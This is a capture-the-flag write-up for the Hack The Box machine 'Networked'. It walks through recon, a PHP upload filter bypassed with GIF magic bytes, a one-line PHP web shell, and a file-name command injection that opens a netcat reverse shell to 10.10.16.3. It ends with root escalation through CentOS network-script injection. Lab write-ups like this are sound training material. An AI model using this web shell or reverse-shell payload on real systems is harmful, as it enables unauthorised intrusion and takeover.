# Networked Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -T4 -sC -sV -oA networked 10.10.10.146``

![image](https://user-images.githubusercontent.com/123066149/227840214-3b304fe1-8e62-4104-a92d-a2b37f2675cd.png)

``gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30``

![image](https://user-images.githubusercontent.com/123066149/227840269-4d6b3ee7-a5af-4c5f-a298-6dd58ad233b3.png)

# ${{\color{purple}Initial Foothold}}\ $

``http://10.10.10.146/backup/``

![image](https://user-images.githubusercontent.com/123066149/227840373-08e60823-63f6-4cc0-9a5c-a231c5c4a623.png)

``tar –xvf documents.tar``

### The upload.php lets us upload files and the photos.php displays them. The backup folder
### contains a tar archive, which seems interesting. Let’s download and examine it

![image](https://user-images.githubusercontent.com/123066149/227840430-e93de6fd-708c-4284-866d-f0ddecc92206.png)

### We obtained the source for the PHP files. Looking at the upload.php, we see it checking the file
type:

![image](https://user-images.githubusercontent.com/123066149/227840656-4c6d27e4-aee4-4159-8e0f-ed6d3f227204.png)

### The check_file_type function is present in the lib.php file:

![image](https://user-images.githubusercontent.com/123066149/227840704-7dc51d5e-a41b-4bf2-9266-e316a2bde0a7.png)

### This in turn calls file_mime_type(), and rejects the file if it’s not an image. The check_file_type()
### function uses mime_content_type() to get the MIME type.

![image](https://user-images.githubusercontent.com/123066149/227840785-b3c2c92b-eea3-4b89-a0f9-ea4aee86e6aa.png)

### The mime_content_type() determines the filetype based on it’s magic bytes, which means that
### we can include magic bytes for a PNG file at the beginning and bypass the filter

![image](https://user-images.githubusercontent.com/123066149/227840934-754fb74e-aa96-489e-9eb0-b2a098083300.png)

### The code only accepts image extensions, although it doesn’t check if it has any other extension
### before them. This can be exploited by adding “.php” before a valid extension, which can be
### exploitable, depending on the Apache configuration. Let’s try uploading a normal PHP shell with
### a PNG extension first

![image](https://user-images.githubusercontent.com/123066149/227841052-4b4e78fe-d4dd-4cb0-96e9-cf330e25f3b5.png)

![image](https://user-images.githubusercontent.com/123066149/227841167-263fd0f8-0534-4a00-8fec-e1cf17881c46.png)


# ${{\color{purple}Exploitation}}\ $

### As expected, the image gets rejected due to invalid MIME type. The magic bytes for PNG are “89
### 50 4E 47 0D 0A 1A 0A”, which can be added to the beginning of the shell
### or this can be added : GIF87a

### A good resource for mime types :

https://developer.mozilla.org/fr/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types

``echo -n -e 'GIF87a <?php echo system($_REQUEST['cmd']); ?>' > test.php.png``

![Capture](https://user-images.githubusercontent.com/123066149/227841834-b763c42a-c266-49dc-a1f7-64808221c9b7.PNG)

![Capture](https://user-images.githubusercontent.com/123066149/227842641-397310f2-31fd-4d89-833c-719c504c3184.PNG)

![image](https://user-images.githubusercontent.com/123066149/227842600-2ce8bdf9-3752-4d0e-93cc-97db985ac6a0.png)


# ${{\color{purple}Privilege Escalation}}\ $

### Browsing to the home folder of the user, two files named check_attack.php and crontab.guly are
### found.

![image](https://user-images.githubusercontent.com/123066149/227843320-a1b71d72-746c-4e17-b4f5-86e265ca86f9.png)

### Here are the contents of the check_attack.php file:

![image](https://user-images.githubusercontent.com/123066149/227844068-b8db5212-4a6f-4750-a795-26b2d0caf341.png)

### The script lists files in the /uploads folder and checks if it is valid based on filename. Any invalid
### files are removed using the system exec() function

![image](https://user-images.githubusercontent.com/123066149/227844227-1976b7a1-48f0-4c01-a085-fb9797b432de.png)

### The $value variable stores the filename, but isn’t sanitized by the script, which means that we can
### inject commands through special file names. For example, a file named “; cmd” will result in the
### command:

![image](https://user-images.githubusercontent.com/123066149/227844740-539c6b45-6e74-4567-9540-b191b026b398.png)

``touch -- ';ping -c 3 10.10.16.3;.php'``

![image](https://user-images.githubusercontent.com/123066149/227845494-d10710e3-4933-48f8-8e2c-a21432e1a0c5.png)

![image](https://user-images.githubusercontent.com/123066149/227846087-d38a33ba-4258-4c9c-89fe-eb9ec5c5e2cc.png)

``touch -- ';nc -c sh 10.10.16.3 5000;.php'``

![image](https://user-images.githubusercontent.com/123066149/227846212-c4f52290-2b68-48bb-b91a-4d7130e08c0d.png)

#### Looking at the sudo privileges, we see that guly can execute changename.sh as root.

![image](https://user-images.githubusercontent.com/123066149/227846847-5740d7e8-5a43-4e94-9b37-bdc8bd2fe270.png)

https://seclists.org/fulldisclosure/2019/Apr/24

``sudo -l``

![image](https://user-images.githubusercontent.com/123066149/227845992-a2b2c4a3-fb09-461b-bcb1-4d12bec8eec1.png)

### The script creates a configuration for the guly0 network interface and uses “ifup guly0” to
### activate it at the end. The user input is validated, and only alphanumeric characters, slashes or a
### dash are allowed. Network configuration scripts on CentOS are vulnerable to command injection
### through the attribute values as described here. This is because the scripts are sourced by the
### underlying service, leading to execution of anything after a space.
### We can exploit this by executing /bin/bash as root

![image](https://user-images.githubusercontent.com/123066149/227846976-ed89973a-9f35-4815-8f0a-4749204d3e4f.png)

![image](https://user-images.githubusercontent.com/123066149/227847970-b2758cd6-691b-443b-81bb-60d69b4e1103.png)

# ${{\color{purple}Point of Improvement}}\ $
